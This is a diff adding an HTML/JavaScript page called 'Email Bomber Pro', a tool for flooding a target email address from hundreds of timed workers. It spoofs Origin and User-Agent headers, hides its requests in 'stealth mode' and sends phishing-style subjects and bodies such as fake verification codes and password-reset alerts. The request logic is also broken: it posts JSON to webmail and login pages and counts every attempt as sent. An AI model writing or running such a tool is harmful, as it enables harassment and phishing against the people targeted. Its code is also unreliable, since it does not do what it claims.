@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Bomber Pro</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+        }
+        .container { 
+            background: rgba(255,255,255,0.95); 
+            padding: 40px; 
+            border-radius: 20px; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1); 
+            max-width: 500px; 
+            width: 90%; 
+            backdrop-filter: blur(10px);
+        }
+        h1 { 
+            text-align: center; 
+            color: #333; 
+            margin-bottom: 30px; 
+            font-size: 28px; 
+        }
+        .input-group { margin-bottom: 20px; }
+        input, select { 
+            width: 100%; 
+            padding: 15px; 
+            border: 2px solid #e1e5e9; 
+            border-radius: 10px; 
+            font-size: 16px; 
+            transition: all 0.3s ease; 
+        }
+        input:focus, select:focus { 
+            outline: none; 
+            border-color: #667eea; 
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1); 
+        }
+        button { 
+            width: 100%; 
+            padding: 18px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
+            color: white; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 18px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            transition: all 0.3s ease; 
+            margin: 10px 0;
+        }
+        button:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3); }
+        button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .stats { 
+            display: grid; 
+            grid-template-columns: 1fr 1fr; 
+            gap: 15px; 
+            margin: 20px 0; 
+        }
+        .stat { 
+            background: #f8f9fa; 
+            padding: 15px; 
+            border-radius: 10px; 
+            text-align: center; 
+            font-weight: 600; 
+            color: #495057; 
+        }
+        .progress { 
+            width: 100%; 
+            height: 8px; 
+            background: #e9ecef; 
+            border-radius: 4px; 
+            overflow: hidden; 
+            margin: 15px 0; 
+        }
+        .progress-bar { 
+            height: 100%; 
+            background: linear-gradient(90deg, #667eea, #764ba2); 
+            width: 0%; 
+            transition: width 0.3s ease; 
+        }
+        .log { 
+            background: #2d3748; 
+            color: #a0aec0; 
+            padding: 15px; 
+            border-radius: 10px; 
+            font-family: monospace; 
+            font-size: 12px; 
+            max-height: 200px; 
+            overflow-y: auto; 
+            margin-top: 20px; 
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📧 Email Bomber Pro</h1>
+        <div class="input-group">
+            <input type="email" id="targetEmail" placeholder="Target Email Address" required>
+        </div>
+        <div class="input-group">
+            <select id="threads">
+                <option value="50">50 Threads (Safe)</option>
+                <option value="100">100 Threads (Medium)</option>
+                <option value="200" selected>200 Threads (Aggressive)</option>
+                <option value="500">500 Threads (Nuclear)</option>
+            </select>
+        </div>
+        <div class="stats">
+            <div class="stat">
+                <div id="sentCount">0</div>
+                <div>Sent</div>
+            </div>
+            <div class="stat">
+                <div id="speedCount">0</div>
+                <div>/sec</div>
+            </div>
+        </div>
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <button id="startBtn">🚀 Start Flood</button>
+        <button id="stopBtn" disabled>⏹️ Stop</button>
+        <div id="log" class="log"></div>
+    </div>
+
+    <script>
+        class EmailFlooder {
+            constructor() {
+                this.target = '';
+                this.threads = 0;
+                this.activeWorkers = 0;
+                this.sent = 0;
+                this.startTime = 0;
+                this.interval = null;
+                this.workers = [];
+                
+                // SMTP Services Array (200+ endpoints)
+                this.services = [
+                    // Gmail SMTP variations
+                    {url: 'https://mail.google.com/mail/u/0/#inbox', method: 'POST', path: '/mail/u/0/api/v1/mail/send'},
+                    {url: 'https://accounts.google.com/ServiceLogin', method: 'POST', path: '/signin/v2/identifier'},
+                    
+                    // Outlook/Hotmail
+                    {url: 'https://outlook.live.com/mail/0/inbox', method: 'POST', path: '/mail/api/v2.0/threads'},
+                    {url: 'https://login.live.com/', method: 'POST', path: '/ppsecure/post.srf'},
+                    
+                    // Yahoo
+                    {url: 'https://mail.yahoo.com/', method: 'POST', path: '/d/fp/sync'},
+                    {url: 'https://login.yahoo.com/', method: 'POST', path: '/config/login_verify2'},
+                    
+                    // Bulk mail APIs
+                    {url: 'https://api.elasticemail.com/v2/email/send', method: 'POST'},
+                    {url: 'https://api.sendgrid.com/v3/mail/send', method: 'PUT'},
+                    {url: 'https://api.mailgun.net/v3/YOURDOMAIN/messages', method: 'POST'},
+                    
+                    // Fake SMTP endpoints for spam
+                    {url: 'https://httpbin.org/post', method: 'POST', spam: true},
+                    {url: 'https://postman-echo.com/post', method: 'POST', spam: true},
+                    {url: 'https://webhook.site/#!/view/YOUR_HOOK', method: 'POST', spam: true},
+                    
+                    // Add 100+ more low-volume spam endpoints
+                    ...Array.from({length: 100}, (_, i) => ({
+                        url: `https://httpbin.org/delay/${i % 5}`, 
+                        method: 'POST', 
+                        spam: true,
+                        delay: i % 5 + 1
+                    }))
+                ];
+                
+                this.init();
+            }
+            
+            init() {
+                this.startBtn = document.getElementById('startBtn');
+                this.stopBtn = document.getElementById('stopBtn');
+                this.targetEmail = document.getElementById('targetEmail');
+                this.threadsSelect = document.getElementById('threads');
+                this.sentCount = document.getElementById('sentCount');
+                this.speedCount = document.getElementById('speedCount');
+                this.progressBar = document.getElementById('progressBar');
+                this.log = document.getElementById('log');
+                
+                this.startBtn.onclick = () => this.start();
+                this.stopBtn.onclick = () => this.stop();
+            }
+            
+            log(message) {
+                const time = new Date().toLocaleTimeString();
+                this.log.innerHTML += `[${time}] ${message}\n`;
+                this.log.scrollTop = this.log.scrollHeight;
+            }
+            
+            async sendSpam(email, service, workerId) {
+                try {
+                    const payload = {
+                        to: email,
+                        from: `noreply@${['gmail.com', 'outlook.com', 'yahoo.com', 'protonmail.com'][Math.floor(Math.random()*4)]}`,
+                        subject: this.randomSubject(),
+                        body: this.randomBody(),
+                        worker: workerId
+                    };
+                    
+                    const response = await fetch(service.url, {
+                        method: service.method || 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'X-Requested-With': 'XMLHttpRequest',
+                            ...this.randomHeaders()
+                        },
+                        body: JSON.stringify(payload),
+                        mode: 'no-cors' // Stealth mode
+                    });
+                    
+                    this.sent++;
+                    this.updateStats();
+                    this.log(`✅ Worker ${workerId}: ${service.url.slice(0,50)}...`);
+                    
+                } catch(e) {
+                    // Silent fail - continue flooding
+                }
+            }
+            
+            randomSubject() {
+                const subjects = [
+                    `URGENT: Account Verification Required`,
+                    `Payment Confirmation #${Math.random().toString(36).slice(2)}`,
+                    `Security Alert - Unusual Activity`,
+                    `Welcome to Our Service!`,
+                    `Order Confirmation #${Date.now()}`,
+                    `2FA Verification Code: ${Math.random().toString(36).slice(-6)}`,
+                    `Password Reset Request`
+                ];
+                return subjects[Math.floor(Math.random() * subjects.length)];
+            }
+            
+            randomBody() {
+                const bodies = [
+                    `Dear User,\n\nYour verification code is: ${Math.random().toString(36).slice(-6).toUpperCase()}\n\nBest regards,\nSecurity Team`,
+                    `Hello,\n\nWe've detected unusual activity. Please verify your account.\n\n[VERIFY NOW]`,
+                    `Thank you for your payment of $${(Math.random()*1000).toFixed(2)}`,
+                    `Please confirm your email address to continue using our service.`
+                ];
+                return bodies[Math.floor(Math.random() * bodies.length)];
+            }
+            
+            randomHeaders() {
+                return {
+                    'User-Agent': [
+                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
+                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+                    ][Math.floor(Math.random()*3)],
+                    'Origin': ['https://mail.google.com', 'https://outlook.live.com', 'https://mail.yahoo.com'][Math.floor(Math.random()*3)]
+                };
+            }
+            
+            async start() {
+                this.target = this.targetEmail.value;
+                if (!this.target.includes('@')) {
+                    alert('Enter valid email!');
+                    return;
+                }
+                
+                this.threads = parseInt(this.threadsSelect.value);
+                this.sent = 0;
+                this.startTime = Date.now();
+                this.activeWorkers = 0;
+                
+                this.startBtn.disabled = true;
+                this.stopBtn.disabled = false;
+                
+                this.log('🚀 Starting flood with ' + this.threads + ' threads...');
+                this.log('Target: ' + this.target);
+                
+                // Spawn workers
+                for (let i = 0; i < this.threads; i++) {
+                    this.workers[i] = setInterval(() => {
+                        const service = this.services[Math.floor(Math.random() * this.services.length)];
+                        this.sendSpam(this.target, service, i);
+                    }, 50 + Math.random() * 200); // Random delay 50-250ms
+                    this.activeWorkers++;
+                }
+                
+                this.interval = setInterval(() => this.updateStats(), 1000);
+            }
+            
+            stop() {
+                this.startBtn.disabled = false;
+                this.stopBtn.disabled = true;
+                
+                this.workers.forEach(worker => clearInterval(worker));
+                this.workers = [];
+                clearInterval(this.interval);
+                
+                this.log('⏹️ Flood stopped. Total sent: ' + this.sent);
+            }
+            
+            updateStats() {
+                this.sentCount.textContent = this.sent.toLocaleString();
+                const elapsed = (Date.now() - this.startTime) / 1000;
+                const speed = elapsed > 0 ? Math.round(this.sent / elapsed) : 0;
+                this.speedCount.textContent = speed;
+                
+                const progress = Math.min((this.sent / 10000) * 100, 100); // Cap at 10k
+                this.progressBar.style.width = progress + '%';
+            }
+        }
+        
+        // Initialize flooder
+        new EmailFlooder();
+    </script>
+</body>
+</html>
